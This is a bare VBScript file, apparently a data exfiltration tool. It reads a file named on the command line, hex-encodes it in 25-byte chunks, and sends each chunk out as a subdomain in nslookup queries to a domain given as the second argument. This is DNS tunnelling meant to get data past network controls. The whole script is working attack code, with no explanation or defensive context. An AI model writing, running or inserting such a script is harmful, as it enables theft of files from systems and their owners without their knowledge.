Set objShell = CreateObject("WScript.Shell")
Set file = CreateObject("Scripting.FileSystemObject").GetFile(Wscript.Arguments(0))
content = file.OpenAsTextStream().Read(file.Size)
pos = 0
While pos < len(content)
 bytes = ""
 For c = 1 To 25
  If Not Mid(content,pos+c,1) = "" Then
   If Asc(Mid(content,pos+c,1)) >= 16 Then
    bytes = bytes & Hex(Asc(Mid(content,pos+c,1)))
   Else
    bytes = bytes & "0" & Hex(Asc(Mid(content,pos+c,1)))
   End If
  End If
 Next
 Wscript.Echo pos & "." & bytes & "." & Wscript.Arguments(1)
 objShell.Exec("nslookup " & pos & "." & bytes & "." & Wscript.Arguments(1)).Stdout.ReadAll()
 pos = pos + 25
 Wscript.Sleep 100
Wend

Wscript.Echo "done"